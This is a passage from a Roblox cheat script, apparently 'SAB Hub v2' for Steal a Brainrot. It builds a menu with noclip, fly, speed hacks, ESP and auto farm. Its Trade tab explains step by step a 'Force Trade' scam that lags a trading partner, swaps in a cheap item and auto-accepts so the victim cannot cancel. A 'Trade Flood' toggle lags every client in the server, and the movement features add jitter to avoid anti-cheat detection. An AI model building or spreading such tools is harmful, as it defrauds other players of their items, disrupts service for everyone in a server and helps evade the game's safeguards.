	spacer3.Size = UDim2.new(1, 0, 0, 8)
	spacer3.BackgroundTransparency = 1
	spacer3.LayoutOrder = 20
	spacer3.Parent = tab

	createSectionLabel(tab, "Auto Farm", 21)
	createToggle(tab, "Auto Farm (Sky Route Loop)", 22, function(on)
		autoFarmActive = on
		if on then startAutoFarm() else stopAutoFarm() end
	end)
	createSlider(tab, "Float Speed", 20, 200, floatSpeed, 23, function(val) floatSpeed = val end)

	local spacer4 = Instance.new("Frame")
	spacer4.Size = UDim2.new(1, 0, 0, 8)
	spacer4.BackgroundTransparency = 1
	spacer4.LayoutOrder = 24
	spacer4.Parent = tab

	createSectionLabel(tab, "Defense", 25)
	createToggle(tab, "Auto Lock Base", 26, function(on)
		autoLockActive = on
		if on then startAutoLock() end
	end)
end

-- ===================== BUILD TRADE TAB =====================
do
	local tab = tabFrames["Trade"]

	createSectionLabel(tab, "Force Trade (Auto Accept via Lag)", 1)
	createInfoLabel(tab, "They Ready with good brainrot -> lag freezes them", 2)
	createInfoLabel(tab, "-> you swap to bad brainrot -> auto accept", 3)

	createButton(tab, "Force Trade (5s Swap Window)", 4, function()
		doForceTrade()
	end)
	createInfoLabel(tab, "Freezes them, unreadies you, gives 5s to swap, accepts", 5)

	createButton(tab, "Instant Force Trade (No Wait)", 6, function()
		doInstantForceTrade()
	end)
	createInfoLabel(tab, "Instantly freezes + spams accept (use after you swap)", 7)

	local spacer = Instance.new("Frame")
	spacer.Size = UDim2.new(1, 0, 0, 8)
	spacer.BackgroundTransparency = 1
	spacer.LayoutOrder = 8
	spacer.Parent = tab

	createSectionLabel(tab, "Manual Lag Control", 9)
	createToggle(tab, "Trade Flood (Lag All Clients)", 10, function(on)
		tradeFloodActive = on
		if on then startTradeFlood() else stopTradeFlood() end
	end)
	createToggle(tab, "Freeze Trade (Max Lag)", 11, function(on)
		tradeFreezeActive = on
		if on then startTradeFreeze() else stopTradeFreeze() end
	end)
	createSlider(tab, "Flood Intensity", 50, 2000, tradeFloodIntensity, 12, function(val) tradeFloodIntensity = val end)
	createInfoLabel(tab, "Higher = more lag but may crash your client too", 13)

	local spacer2 = Instance.new("Frame")
	spacer2.Size = UDim2.new(1, 0, 0, 8)
	spacer2.BackgroundTransparency = 1
	spacer2.LayoutOrder = 14
	spacer2.Parent = tab

	createSectionLabel(tab, "Trade GUI Actions", 15)
	createButton(tab, "Click Accept/Ready", 16, function() clickOwnAccept() end)
	createButton(tab, "Click Unready/Cancel", 17, function() clickOwnUnready() end)

	local spacer3 = Instance.new("Frame")
	spacer3.Size = UDim2.new(1, 0, 0, 8)
	spacer3.BackgroundTransparency = 1
	spacer3.LayoutOrder = 18
	spacer3.Parent = tab

	createSectionLabel(tab, "Debug Tools", 19)
	createButton(tab, "Scan Remotes", 20, function() scanTradeRemotes() end)
	createButton(tab, "Dump Trade GUI (F9)", 21, function() dumpTradeGui() end)
	createButton(tab, "Dump All Remotes (F9)", 22, function() dumpAllRemotes() end)
	createInfoLabel(tab, "Use F9 console to see remote/GUI names", 23)

	local spacer4 = Instance.new("Frame")
	spacer4.Size = UDim2.new(1, 0, 0, 8)
	spacer4.BackgroundTransparency = 1
	spacer4.LayoutOrder = 24
	spacer4.Parent = tab

	createSectionLabel(tab, "How Force Trade Works", 25)
	createInfoLabel(tab, "1. Open Trade Machine, put GOOD brainrot in", 26)
	createInfoLabel(tab, "2. Wait for them to click Ready", 27)
	createInfoLabel(tab, "3. Hit 'Force Trade' - lag freezes them", 28)
	createInfoLabel(tab, "4. Swap to cheap brainrot in the 5s window", 29)
	createInfoLabel(tab, "5. Script auto-accepts, they can't cancel", 30)
	createInfoLabel(tab, "6. Trade completes with bad brainrot", 31)
end

-- ===================== BUILD MOVEMENT TAB =====================
do
	local tab = tabFrames["Movement"]
	createSectionLabel(tab, "Movement", 1)
	createToggle(tab, "Noclip (Walk Through Walls)", 2, function(on)
		noclipActive = on
		if on then startNoclip() else stopNoclip() end
	end)
	createInfoLabel(tab, "Stepped-phase noclip (minimal detection window)", 3)
	createToggle(tab, "Fly (Space=Up, Shift=Down)", 4, function(on)
		flyActive = on
		if on then startFly() else stopFly() end
	end)
	createInfoLabel(tab, "BodyVelocity + BodyGyro (physics-based, not raw set)", 5)
	createSlider(tab, "Fly Speed", 10, 200, flySpeed, 6, function(val) flySpeed = val end)

	local spacer = Instance.new("Frame")
	spacer.Size = UDim2.new(1, 0, 0, 8)
	spacer.BackgroundTransparency = 1
	spacer.LayoutOrder = 7
	spacer.Parent = tab

	createSectionLabel(tab, "Speed (Velocity-Based)", 8)
	createInfoLabel(tab, "Velocity + random jitter to avoid pattern detection", 9)
	createToggle(tab, "Speed Boost", 10, function(on)
		speedBoostActive = on
		if on then startSpeedBoost() else stopSpeedBoost() end
	end)
	createSlider(tab, "Speed Value", 20, 150, speedValue, 11, function(val) speedValue = val end)
end

-- ===================== BUILD ESP TAB =====================
do
	local tab = tabFrames["ESP"]
	createSectionLabel(tab, "Player ESP", 1)
	createToggle(tab, "Player ESP (Highlights + Names)", 2, function(on)
		espActive = on
		if on then startESP() else stopESP() end
	end)

	local spacer = Instance.new("Frame")
	spacer.Size = UDim2.new(1, 0, 0, 8)
	spacer.BackgroundTransparency = 1
	spacer.LayoutOrder = 3
	spacer.Parent = tab

	createSectionLabel(tab, "Brainrot ESP", 4)
	createToggle(tab, "Brainrot ESP (See All Brainrots)", 5, function(on)
		brainrotEspActive = on
		if on then startBrainrotESP() else stopBrainrotESP() end
	end)
end

-- ===================== MINIMIZE / TOGGLE =====================
local contentVisible = true
minimizeBtn.MouseButton1Click:Connect(function()
	contentVisible = not contentVisible
	for _, frame in pairs(tabFrames) do frame.Visible = contentVisible and frame == tabFrames[activeTab] end
	tabBar.Visible = contentVisible
	mainFrame.Size = contentVisible and UDim2.new(0, 480, 0, 400) or UDim2.new(0, 480, 0, 32)
	minimizeBtn.Text = contentVisible and "-" or "+"
end)

UserInputService.InputBegan:Connect(function(input, processed)
	if processed then return end
	if input.KeyCode == Enum.KeyCode.RightShift then
		windowVisible = not windowVisible
		mainFrame.Visible = windowVisible
	end
end)

LocalPlayer.CharacterAdded:Connect(function()
	-- Wait for character to fully load
	wait(1)
	if noclipActive then stopNoclip() wait(0.3) startNoclip() end
	if flyActive then stopFly() wait(0.3) startFly() end
	if speedBoostActive then stopSpeedBoost() wait(0.3) startSpeedBoost() end
	if antiRagdollActive then stopAntiRagdoll() wait(0.3) startAntiRagdoll() end
	if antiHitActive then stopAntiHit() wait(0.3) startAntiHit() end
	if instaPickUpActive then wait(0.3) startInstaPickUp() end
end)

-- ===================== STARTUP =====================
notify("SAB Hub v2", "Loaded! Anti-cheat aware mode")
print("[SAB Hub v2] Loaded - Right Shift to toggle")
print("[SAB Hub v2] SAVE YOUR BASE POSITION FIRST!")
